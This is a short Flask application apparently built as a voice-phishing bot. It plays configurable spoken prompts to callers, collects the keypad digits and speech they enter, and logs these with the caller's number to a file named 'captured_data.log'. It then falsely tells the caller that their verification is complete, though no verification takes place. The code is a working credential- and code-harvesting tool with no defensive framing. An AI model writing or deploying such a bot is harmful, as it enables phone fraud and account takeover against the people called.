from flask import Flask, request, Response
import json
import os

app = Flask(__name__)

def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

@app.route('/voice', methods=['POST'])
def voice():
    config = load_config()
    twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="alice" language="en-US">{config['intro_message']}</Say>
    <Gather input="dtmf speech" action="/gather" timeout="10" finishOnKey="#">
        <Say>{config['prompt_message']}</Say>
    </Gather>
    <Redirect>/voice</Redirect>
</Response>"""
    return Response(twiml, mimetype='text/xml')

@app.route('/gather', methods=['POST'])
def gather():
    digits = request.form.get('Digits', '')
    speech = request.form.get('SpeechResult', '')
    
    log_data = {
        "digits": digits,
        "speech": speech,
        "caller": request.form.get('From')
    }
    
    with open('captured_data.log', 'a') as f:
        f.write(json.dumps(log_data) + "\n")
        
    twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say>Thank you. Your verification is complete.</Say>
    <Hangup/>
</Response>"""
    return Response(twiml, mimetype='text/xml')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)